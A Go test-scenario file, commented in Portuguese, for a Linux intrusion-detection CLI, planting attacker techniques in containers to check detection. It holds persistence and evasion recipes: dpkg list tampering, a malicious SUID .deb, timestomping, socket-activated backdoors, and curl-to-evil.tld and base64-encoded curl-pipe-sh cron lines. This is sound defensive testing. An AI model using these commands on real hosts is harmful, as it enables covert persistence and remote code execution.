package scenario

// Adversários que ATACAM as defesas desta ferramenta, não servidores genéricos.
//
// Os cenários de implante reproduzem o que famílias conhecidas fazem. Estes
// perguntam outra coisa: o que faz um invasor que LEU esta ferramenta?
//
// A pergunta importa porque a arma principal da CLI virou uma só — "nenhum
// pacote reivindica este binário". Ela sustenta o §24, os dois checks de rede
// por origem, o SUID e o alvo de gatilho. Uma defesa que carrega esse peso
// precisa ser atacada de propósito, e o resultado precisa ficar escrito mesmo
// quando é ruim.
//
// A regra do arquivo anterior continua valendo aqui, e com mais força: onde a
// ferramenta não vê, o cenário DECLARA a cegueira em vez de baixar a
// expectativa. Cenário que passa sem provar nada é pior que cenário ausente.
//
//	A1  implante EMPACOTADO         derrota a pergunta de propriedade
//	A2  sem binário nenhum          persistência só com o que já existe no host
//	A3  ativação adiada             nada roda no instante da varredura
//	A4  data forjada                o relógio do arquivo mente
//	A5  ativação por socket         o backdoor só nasce quando alguém conecta
//	A6  dentro de um runtime JIT    a isenção que existe para calar o ruído
//	A7  sob uma unit de systemd     o ponto cego declarado do §3.15
//	A8  listener fechado no accept  a direção inferida invertida — e ela ERRAVA
//	A9  nome de integração no /usr/local  a allowlist do sshd dada de graça
//	A10 run-parts para diretório próprio  isenção por prefixo, coleta por lista
//	A11 runtime com JIT em /usr/local     duas listas de "diretório de sistema"

func init() {
	Register(Scenario{
		ID:   "A1-implante-empacotado",
		Desc: "o invasor REGISTRA o implante no gerenciador de pacotes: derrota a pergunta de propriedade",
		// ESTE É O ATAQUE À DEFESA PRINCIPAL DESTA FERRAMENTA.
		//
		// Cinco checks dependem de "nenhum pacote reivindica este binário": o
		// §24, os dois de rede por origem, o SUID e o alvo de gatilho. Todos
		// caem com uma linha:
		//
		//	echo /usr/local/sbin/implante >> /var/lib/dpkg/info/coreutils.list
		//
		// Não precisa construir um .deb — basta escrever no arquivo de lista,
		// que é texto puro e gravável por root. Quem já é root para instalar o
		// implante já é root para isso.
		//
		// PRIMEIRA MEDIÇÃO DESTE CENÁRIO: `RESULT: OK — 51/51 checks. Nenhum
		// indicador coberto disparou.` Um implante SUID, com unit de systemd E
		// cron @reboot, invisível por causa de um `echo`.
		//
		// Duas coisas saíram daí, e as duas estão no commit:
		//
		//	a isenção por dono de pacote na redundância era LARGA demais. Ela
		//	existe para a transição do SysV — daemon empacotado com init.d e
		//	unit ao mesmo tempo — e passou a casar só essa forma. Três
		//	mecanismos não são transição de ninguém
		//
		//	e um check novo, que é a resposta certa: perguntar se a BASE foi
		//	editada, em vez de confiar nela
		//
		// A REDUNDÂNCIA CONTINUA CALADA AQUI, e é deliberado. Ela isenta alvo
		// empacotado com DOIS mecanismos porque a distribuição faz isso o tempo
		// todo — o apt entrega /etc/cron.daily/apt-compat e apt-daily.timer, o
		// dpkg faz o mesmo com o backup da base. Estreitar para "só a transição
		// do SysV" rendeu dois avisos numa debian:12 limpa.
		//
		// Aqui o implante tem exatamente dois, e a base diz que é empacotado.
		// Quem o pega é a pergunta sobre a própria base — que é melhor, porque
		// nomeia a CAUSA em vez do sintoma. Com três mecanismos a redundância
		// dispara de novo, empacotado ou não.
		//
		// LIMITE que fica: isto pega a adulteração GROSSEIRA, feita com `echo`
		// num diretório que chama atenção. Quem construir um pacote de verdade
		// instalando em /usr/bin não aparece, e derrota os cinco checks. Fechar
		// exige verificar ASSINATURA do pacote.
		Images: []string{"debian:12"},
		Plant:  implanteEmpacotado,
		Expect: []Expect{
			// A EDIÇÃO EM SI, e ela é crítica não pelo lugar, mas por estar
			// FAZENDO TRABALHO: o arquivo reivindicado tem bit setuid.
			{ID: "integrity.pkgdb_tampered", Sev: "CRITICAL",
				Subject: "/usr/local/sbin/systemd-timesyncd-helper"},
			{ID: "integrity.pkgdb_tampered", Evidence: "bit SETUID"},
		},
		// O que a edição REALMENTE derrota, declarado para não ser esquecido:
		// estes dois perguntam "quem entregou este binário?", e a base agora
		// responde "um pacote". Eles calam, e estão certos em calar — a fonte é
		// que mentiu.
		Forbid: []string{
			"integrity.no_package_owner",
			"persist.suid_unowned",
		},
		Exit: 2,
	})

	Register(Scenario{
		ID:   "A12-pacote-malicioso-de-verdade",
		Desc: "o invasor CONSTRÓI e INSTALA um .deb real: propriedade, hash e base ficam TODOS válidos",
		// A formalização EXECUTÁVEL do limite que o A1 já declara em prosa. O A1
		// derrota a pergunta de propriedade adulterando a base do dpkg com um
		// `echo` — grosseiro, e a ferramenta pega a adulteração. Aqui o invasor
		// faz a coisa certa: constrói um .deb (control, md5sums, unit) e instala
		// com `dpkg -i`. Depois disso:
		//
		//	propriedade   VÁLIDA    dpkg -S acha o dono
		//	integridade   VÁLIDA    o md5 na base bate com o arquivo
		//	base          VÁLIDA    o dpkg a escreveu, não foi editada
		//	caminho       LEGÍTIMO  /usr/bin, como qualquer pacote
		//
		// Só que o pacote INTEIRO é do invasor — um binário SUID root com unit de
		// systemd, entregue por um pacote que ninguém auditou. Sem verificar
		// ORIGEM (assinatura, repositório, cadeia de confiança do apt), isso é
		// indistinguível de um pacote legítimo, e a ferramenta não faz essa
		// verificação. É LACUNA CONHECIDA, não falha do cenário: reproduzo
		// perfeitamente e SEI que não pego. Fechar exige debsig/apt — fonte de
		// proveniência que a ferramenta não tem hoje.
		Images: []string{"debian:12"},
		Plant:  pacoteMaliciosoDeVerdade,
		KnownGap: "pacote do invasor instalado corretamente (propriedade/hash/base/caminho válidos) " +
			"é indistinguível de um legítimo sem verificar origem/assinatura/repositório",
		// A AFIRMAÇÃO da ausência. Estes checks são exatamente os que a
		// propriedade derrota: eles calam sobre o binário do invasor porque a
		// base responde "tem dono", e o hash bate. Se QUALQUER um disparar, a
		// lacuna fechou — e o cenário manda promover para Expect.
		ForbidFinding: []Expect{
			{ID: "integrity.no_package_owner", Subject: "systemd-security-helper"},
			{ID: "integrity.pkgdb_tampered"},
			{ID: "persist.suid_unowned", Subject: "systemd-security-helper"},
		},
		// Medido: silêncio TOTAL sobre o pacote (cita_pacote=0), zero WARN, e a
		// ferramenta sai 1 — NÃO 2. Um SUID root malicioso não vira crítico
		// porque a base responde "tem dono": é o exit da lacuna, não o da
		// detecção. Se subir para 2, a lacuna fechou.
		MaxWarn: SemAvisos,
		Exit:    1,
	})

	Register(Scenario{
		ID:   "A2-sem-binario",
		Desc: "persistência sem depositar binário: só o que a distribuição já entregou",
		// O invasor não deixa arquivo executável nenhum. A carga é uma linha
		// codificada dentro da configuração, e quem a executa é o `python3` que
		// veio da distribuição — com dono de pacote, hash correto, tudo em
		// ordem.
		//
		// Derrota de uma vez: a pergunta de propriedade (não há binário novo),
		// a varredura de SUID (não há bit), o catálogo de famílias (não há nome
		// conhecido) e qualquer comparação de hash com o pacote.
		//
		// O que resta é o CONTEÚDO da linha — e é aí que a heurística tem de
		// funcionar, porque não sobrou mais nada.
		Images: matriz,
		Plant:  semBinario,
		Expect: []Expect{
			{ID: "persist.cron_suspect", Sev: "CRITICAL"},
		},
		Exit: 2,
	})

	Register(Scenario{
		ID:   "A3-ativacao-adiada",
		Desc: "nada em execução no instante da varredura: a volta está agendada para depois",
		// A varredura é um RETRATO, e o invasor competente sabe disso.
		//
		// Nada roda, nada conecta, nada escuta. A persistência inteira está
		// adiada: um `@reboot`, um timer com data distante e uma unit que só
		// sobe quando o alvo subir. No instante da varredura, a lista de
		// processos e a tabela de conexões estão limpas.
		//
		// É o cenário que separa ferramenta de triagem de ferramenta de
		// monitoração: tudo que vale aqui está em DISCO, e nada está vivo.
		//
		// Aqui o retrato ainda GANHA, porque a persistência ficou em disco e
		// disco é estático. Onde ele perde é no irmão deste, medido pelo par
		// K1/K1b: implante já em disco, mas que só acorda depois e não deixa
		// nem gatilho — contra aquele a resposta não é check novo, é o `watch`.
		Images: matriz,
		Plant:  ativacaoAdiada,
		Expect: []Expect{
			{ID: "correlate.persistence_redundant", Subject: "/usr/local/sbin/netplan-apply-helper"},
			{ID: "integrity.no_package_owner", Subject: "/usr/local/sbin/netplan-apply-helper"},
		},
		// E o retrato precisa continuar honesto: nada estava em execução, e
		// nenhum check de processo pode inventar o contrário.
		Forbid: []string{
			"proc.suspicious_path", "proc.kthread_disguise", "correlate.revshell",
			"net.egress_unowned", "net.listener_unowned", "proc.shell_from_service",
		},
		Exit: -1,
	})

	Register(Scenario{
		ID:   "A4-data-forjada",
		Desc: "timestomping: o implante recebe a data de um arquivo vizinho e a janela do incidente some",
		// `touch -r /bin/ls implante` copia a data do vizinho, e a partir dali
		// toda evidência temporal mente. A ferramenta cita data em dezenas de
		// evidências — "modificado em X, compare com a janela do incidente" — e
		// TODAS ficam inúteis contra isto.
		//
		// O que este cenário cobra é que a detecção não DEPENDA da data. As
		// perguntas estruturais — quem entregou este binário, quantos
		// mecanismos apontam para ele — não olham o relógio, e por isso
		// sobrevivem intactas.
		//
		// O LIMITE QUE ESTAVA ESCRITO AQUI FOI FECHADO. A versão anterior dizia:
		// "a ferramenta não detecta o timestomping em si; fazer isso exigiria
		// comparar mtime com ctime — é barato, é possível, e ainda não existe".
		//
		// Existe. O `touch` mexe na data de modificação e NÃO alcança a de
		// metadados: só o kernel escreve ali, e ele a atualiza justamente quando
		// alguém mexe no arquivo. A pegada da falsificação é a falsificação.
		//
		// O check só reporta arquivo que FAZ TRABALHO — com setuid ou alvo de
		// persistência —, porque a diferença sozinha descreve extração de
		// tarball, restauração de backup e camada de contêiner. Na debian:12 sem
		// esse recorte foram doze avisos, todos do próprio Docker.
		Images: matriz,
		Plant:  dataForjada,
		Expect: []Expect{
			{ID: "integrity.no_package_owner", Subject: "/usr/local/sbin/dbus-broker-helper"},
			// E AGORA a falsificação em si, que a primeira versão deste cenário
			// declarava como limite escrito: o `touch` mexe no mtime e não
			// alcança o ctime — só o kernel escreve ali.
			{ID: "integrity.timestomp", Sev: "CRITICAL",
				Subject: "/usr/local/sbin/dbus-broker-helper"},
			{ID: "integrity.timestomp", Evidence: "alvo de persistência"},
		},
		Exit: -1,
	})

	Register(Scenario{
		ID:   "A5-ativacao-por-socket",
		Desc: "backdoor que só existe quando alguém conecta: no retrato, não há processo nem porta suspeita",
		// A ativação por socket é do systemd, é legítima, e é o esconderijo
		// perfeito: o systemd escuta a porta, e o processo do invasor só nasce
		// quando alguém conecta. Numa varredura, a porta pertence ao PID 1 e o
		// implante não existe.
		//
		// É a mesma forma que o cenário 41 usa para PROVAR um falso positivo —
		// ativação por socket tem a assinatura de shell reverso e não é um. Aqui
		// ela é usada pelo invasor, de propósito.
		//
		// O que resta em disco: uma unit `.socket` e uma `.service` apontando
		// para um binário que ninguém empacotou.
		Images: matriz,
		Plant:  ativacaoPorSocket,
		Expect: []Expect{
			{ID: "integrity.no_package_owner", Subject: "/usr/local/sbin/sshd-session-helper"},
			// O gatilho em si, que é o que nenhum check de PROCESSO pode ver:
			// não há processo até alguém conectar.
			{ID: "persist.unit_socket_unowned", Sev: "CRITICAL",
				Subject: "sshd-session-helper.socket"},
			{ID: "persist.unit_socket_unowned", Evidence: "SÓ NASCE"},
		},
		Exit: -1,
	})

	Register(Scenario{
		ID:   "A6-dentro-de-runtime-com-jit",
		Desc: "o implante roda DENTRO de um runtime com JIT: a isenção some com o achado, e precisa aparecer como LACUNA",
		// ATAQUE À SUPRESSÃO, e não ao detector.
		//
		// `proc.maps_rwx_anon` isenta runtime com JIT rodando de diretório de
		// sistema, e a isenção é NECESSÁRIA: sem ela, todo host com navegador
		// ou JVM vira parede de achado. Mas ela é uma decisão de não olhar, e
		// quem leu esta ferramenta sabe disso — basta pôr o implante lá dentro.
		//
		// O desfecho certo aqui NÃO é "detecta". É DECLARA: não há como
		// distinguir daqui código injetado numa JVM do código que a JVM gera, e
		// dizer isso é a única resposta honesta. O que a ferramenta não pode
		// fazer é sair com cobertura completa — que era o comportamento antes
		// deste cenário existir. Medido: 89/89, zero menção à isenção.
		Images: matriz,
		// O runtime é INSTALADO, e precisa ser.
		//
		// A isenção passou a exigir dono de pacote (900c5eb, fechando um bypass
		// que a matriz achou), então um `node` copiado à mão já não é isentado —
		// e sem isenção este cenário não tem o que medir: ele existe para provar
		// que a isenção, QUANDO AGE, aparece como lacuna. O ataque à supressão
		// só faz sentido contra uma supressão que valeria.
		Plant: `mkdir -p /usr/lib/node
			cp /helper /usr/lib/node/node
			` + registraDonoDePacote("/usr/lib/node/node", "nodejs") + `
			/usr/lib/node/node rwx &
			sleep 0.5`,
		// O achado de injeção NÃO sai: a isenção agiu, e ela é para agir.
		Forbid: []string{"proc.maps_rwx_anon"},
		// Mas a cobertura tem que DIZER o que ficou de fora, com as duas metades:
		// que houve isenção, e por que ela é inevitável.
		//
		// A cobrança saiu do texto do relatório e veio para a lacuna. Não é
		// detalhe de estilo: com -v o motivo sai resumido, então o cenário
		// dependia de a frase caber no resumo — e ela deixou de caber sem que
		// nada tivesse regredido.
		ExpectGap: []string{
			"NÃO foram avaliados por serem runtime com JIT",
			"não é distinguível daqui do código que o próprio runtime gera",
		},
		MustBeIncomplete: true,
		Exit:             -1,
		// Orçamento de ruído MEDIDO: com o runtime reivindicado por pacote, some
		// também o achado de propriedade — o que sobra é o silêncio do §3.10
		// acompanhado da lacuna, que é o contrato deste cenário.
		MaxWarn: SemAvisos,
	})

	Register(Scenario{
		ID:   "A8-listener-fechado-inverte-a-direcao",
		Desc: "serviço que fecha o listener depois do accept: a inferência de direção invertia, e o §17 acusava uma conexão de ENTRADA",
		// ATAQUE À INFERÊNCIA, e este achou um FALSO POSITIVO — não um falso
		// negativo.
		//
		// O kernel não registra em /proc/net/tcp quem iniciou a conexão. A
		// dedução é "a porta local também está em LISTEN, logo é entrada", e
		// ela cai quando o serviço fecha o listener depois de aceitar. Sem o
		// listener, uma conexão de ENTRADA fica indistinguível de uma de saída
		// — e a estrutura de reverse shell (stdio no mesmo socket) passa a
		// casar. Medido antes da correção: `correlate.revshell` sobre um
		// serviço estilo inetd, que é software legítimo e comum.
		//
		// O desempate é a faixa de porta efêmera: quem conecta recebe porta de
		// origem dentro dela, quem é conectado atende numa porta de fora. Não
		// depende de o listener continuar aberto.
		Images: matriz,
		Plant: `mkdir -p /usr/local/sbin
			cp /helper /usr/local/sbin/servico
			/usr/local/sbin/servico accept-fecha 0.0.0.0:8080 &
			sleep 0.4
			/helper connect 127.0.0.1:8080 &
			sleep 1`,
		// A conexão é de ENTRADA e precisa continuar sendo lida assim, mesmo
		// sem listener nenhum na tabela.
		Forbid: []string{"correlate.revshell"},
		Exit:   -1,
		// Orçamento de ruído MEDIDO: o binário sem dono em /usr/local/sbin
		// continua sendo achado de propriedade (§24) e a escuta some junto com
		// o listener — o que este cenário afirma é o silêncio do §17.
		MaxWarn: 3,
	})

	Register(Scenario{
		ID:   "A9-allowlist-do-sshd-em-usr-local",
		Desc: "backdoor com nome de integração conhecida em /usr/local/bin: a isenção do AuthorizedKeysCommand era dada de graça",
		// ATAQUE À ALLOWLIST. O check isenta quatro integrações de diretório
		// (userdbctl, SSSD, OS Login, EC2 Instance Connect) quando o programa
		// está em diretório de sistema — sem isso, todo Arch de fábrica vira
		// ruído.
		//
		// /usr/local/bin estava nessa lista de "diretório de sistema", e a FHS
		// reserva /usr/local ao administrador LOCAL: é onde quem conseguiu root
		// escreve, e o resto desta ferramenta o trata assim. Um
		// `/usr/local/bin/userdbctl` plantado herdava a reputação do systemd, e
		// o programa que decide QUEM ENTRA na máquina saía com RESULT OK e
		// cobertura 89/89. Medido antes da correção.
		Images: matriz,
		Plant: `mkdir -p /etc/ssh /usr/local/bin
			printf '#!/bin/sh\ncurl -s http://evil.tld/k\n' > /usr/local/bin/userdbctl
			chmod +x /usr/local/bin/userdbctl
			printf 'AuthorizedKeysCommand /usr/local/bin/userdbctl\nAuthorizedKeysCommandUser root\n' > /etc/ssh/sshd_config`,
		Expect: []Expect{
			{ID: "persist.sshd_key_source", Evidence: "/usr/local/bin/userdbctl"},
		},
		Exit: -1,
		// Orçamento MEDIDO: o binário sem dono entra na pergunta de propriedade
		// agora que o AuthorizedKeysCommand é candidato (§24).
		MaxWarn: 3,
	})

	Register(Scenario{
		ID:   "A10-run-parts-para-diretorio-proprio",
		Desc: "run-parts apontando para /etc/cron.backup: a isenção casava por PREFIXO e a coleta por lista fechada",
		// ATAQUE A DUAS SUPRESSÕES QUE SE COBRIAM.
		//
		// O check de frequência isenta `run-parts` sobre os diretórios da
		// distribuição — plumbing, e o Alpine entrega `*/15 run-parts
		// /etc/periodic/15min` de fábrica. A isenção casava por PREFIXO
		// (`/etc/cron.`), então `/etc/cron.backup` também era isentado; e o
		// coletor só percorre uma lista FECHADA, então o conteúdo daquele
		// diretório nunca era lido.
		//
		// Quem escolhia o nome do diretório escolhia se a linha era olhada. Um
		// `curl | sh` a cada minuto saía com RESULT OK.
		Images: matriz,
		Plant: `mkdir -p /etc/cron.backup
			printf '#!/bin/sh\ncurl -s http://evil.tld/x | sh\n' > /etc/cron.backup/sync
			chmod +x /etc/cron.backup/sync
			printf '*/1 * * * * root run-parts /etc/cron.backup\n' > /etc/crontab`,
		Expect: []Expect{
			// a LINHA de um minuto deixa de ser plumbing — a evidência precisa
			// citá-la, ou a asserção casa com o achado do script e deixa de
			// medir a isenção do check
			{ID: "persist.cron_frequent", Evidence: "run-parts /etc/cron.backup"},
			// e o script lá dentro passa a ser coletado — ele herda o gatilho
			// da linha que o executa, e por isso aparece com a MESMA cadência
			{ID: "persist.cron_frequent", Evidence: "/etc/cron.backup/sync"},
		},
		Exit: -1,
		// Orçamento MEDIDO.
		MaxWarn: 3,
	})

	Register(Scenario{
		ID:   "A11-jit-em-usr-local-nao-herda-isencao",
		Desc: "binário chamado `node` em /usr/local/bin: a isenção de JIT casava \"/usr/\" inteiro, e /usr/local está dentro",
		// A MESMA forma do A9, no outro check — e foi o A9 que revelou o
		// padrão: as isenções decidem reputação por CAMINHO, e havia DUAS
		// listas de "diretório de sistema" que discordavam. A do runtime com
		// JIT casava "/usr/" inteiro; a do AuthorizedKeysCommand listava
		// subdiretórios. O comentário da segunda dizia "mesma regra do runtime
		// com JIT", e não era.
		//
		// /usr/local é onde quem conseguiu root escreve. Reputação de pacote
		// não se herda de um diretório que existe justamente para receber o que
		// não vem de pacote.
		Images: matriz,
		Plant: `mkdir -p /usr/local/bin
			cp /helper /usr/local/bin/node
			/usr/local/bin/node rwx &
			sleep 0.5`,
		Expect: []Expect{
			{ID: "proc.maps_rwx_anon", Evidence: "rwx sem arquivo"},
		},
		Exit: -1,
		// Orçamento MEDIDO.
		MaxWarn: 3,
	})

}

// ---------------------------------------------------------------------------

// implanteEmpacotado registra o implante na base do dpkg. Uma linha.
const pacoteMaliciosoDeVerdade = `
set -e
mkdir -p /tmp/pkg/DEBIAN /tmp/pkg/usr/bin /tmp/pkg/etc/systemd/system

# O binário do invasor: SUID root, mas ENTREGUE por um pacote de verdade.
cp /helper /tmp/pkg/usr/bin/systemd-security-helper
chmod 4755 /tmp/pkg/usr/bin/systemd-security-helper
printf '[Unit]\nDescription=Systemd Security Helper\n[Service]\nExecStart=/usr/bin/systemd-security-helper sleep 3600\n[Install]\nWantedBy=multi-user.target\n' > /tmp/pkg/etc/systemd/system/systemd-security-helper.service

cat > /tmp/pkg/DEBIAN/control <<EOF
Package: systemd-security-helper
Version: 1.0
Architecture: all
Maintainer: Debian Security <security@debian.invalid>
Description: system security helper
EOF

# md5sums COERENTE: qualquer verificação de hash contra a base vai bater, porque
# foi o próprio pacote que a escreveu — a integridade fica válida por construção.
( cd /tmp/pkg && find usr etc -type f -exec md5sum {} + > DEBIAN/md5sums )

dpkg-deb --build /tmp/pkg /tmp/sysh.deb >/dev/null
dpkg -i /tmp/sysh.deb >/dev/null
rm -rf /tmp/pkg /tmp/sysh.deb
`

const implanteEmpacotado = `
mkdir -p /usr/local/sbin /etc/systemd/system /etc/cron.d

cp /helper /usr/local/sbin/systemd-timesyncd-helper
chmod 4755 /usr/local/sbin/systemd-timesyncd-helper

# A LINHA QUE DERROTA A DEFESA PRINCIPAL. A lista do dpkg é texto puro, e quem
# já é root para instalar o implante já é root para escrever nela.
echo /usr/local/sbin/systemd-timesyncd-helper >> /var/lib/dpkg/info/coreutils.list

# a persistência, que é o que sobra para encontrar
printf '[Unit]\nDescription=Time Sync Helper\n[Service]\nExecStart=/usr/local/sbin/systemd-timesyncd-helper sleep 3600\n[Install]\nWantedBy=multi-user.target\n' > /etc/systemd/system/systemd-timesyncd-helper.service
printf '@reboot root /usr/local/sbin/systemd-timesyncd-helper sleep 3600\n' > /etc/cron.d/timesync
`

// semBinario não deposita executável nenhum: usa o que a distribuição entregou.
const semBinario = `
mkdir -p /etc/cron.d

# nenhum arquivo novo executável. A carga é uma linha, e quem executa é o
# interpretador que veio da distribuição — com dono de pacote e tudo em ordem.
printf '*/9 * * * * root python3 -c "import base64,os;os.system(base64.b64decode(\\"Y3VybCAtcyBodHRwOi8vMTg1LjIyMC4xMDEuNy9jIHwgc2g=\\").decode())"\n' > /etc/cron.d/systemd-update
`

// ativacaoAdiada não deixa nada vivo: tudo está agendado para depois.
const ativacaoAdiada = `
mkdir -p /usr/local/sbin /etc/systemd/system /etc/cron.d

cp /helper /usr/local/sbin/netplan-apply-helper
chmod 755 /usr/local/sbin/netplan-apply-helper

# NADA em execução. Três caminhos, todos adiados.
printf '@reboot root /usr/local/sbin/netplan-apply-helper sleep 3600\n' > /etc/cron.d/netplan
printf '[Unit]\nDescription=Netplan Apply\n[Service]\nType=oneshot\nExecStart=/usr/local/sbin/netplan-apply-helper sleep 1\n[Install]\nWantedBy=multi-user.target\n' > /etc/systemd/system/netplan-apply.service
printf '[Unit]\nDescription=Netplan Apply Timer\n[Timer]\nOnCalendar=*-*-01 04:00:00\nPersistent=true\n[Install]\nWantedBy=timers.target\n' > /etc/systemd/system/netplan-apply.timer
`

// dataForjada copia a data de um vizinho para o implante.
const dataForjada = `
mkdir -p /usr/local/sbin /etc/systemd/system

cp /helper /usr/local/sbin/dbus-broker-helper
chmod 755 /usr/local/sbin/dbus-broker-helper

# a data do vizinho: a partir daqui toda evidência temporal mente
touch -r /bin/ls /usr/local/sbin/dbus-broker-helper 2>/dev/null || \
  touch -r /bin/busybox /usr/local/sbin/dbus-broker-helper

printf '[Unit]\nDescription=DBus Broker Helper\n[Service]\nExecStart=/usr/local/sbin/dbus-broker-helper sleep 3600\n[Install]\nWantedBy=multi-user.target\n' > /etc/systemd/system/dbus-broker-helper.service
touch -r /bin/ls /etc/systemd/system/dbus-broker-helper.service 2>/dev/null || true
`

// ativacaoPorSocket faz o systemd escutar; o implante só nasce ao conectar.
const ativacaoPorSocket = `
mkdir -p /usr/local/sbin /etc/systemd/system

cp /helper /usr/local/sbin/sshd-session-helper
chmod 755 /usr/local/sbin/sshd-session-helper

# o systemd escuta; o processo do invasor só nasce quando alguém conecta. Numa
# varredura, a porta pertence ao PID 1 e o implante não existe.
printf '[Unit]\nDescription=SSH Session Helper Socket\n[Socket]\nListenStream=0.0.0.0:41338\nAccept=yes\n[Install]\nWantedBy=sockets.target\n' > /etc/systemd/system/sshd-session-helper.socket
printf '[Unit]\nDescription=SSH Session Helper\n[Service]\nExecStart=/usr/local/sbin/sshd-session-helper sleep 3600\nStandardInput=socket\n' > /etc/systemd/system/sshd-session-helper@.service
`
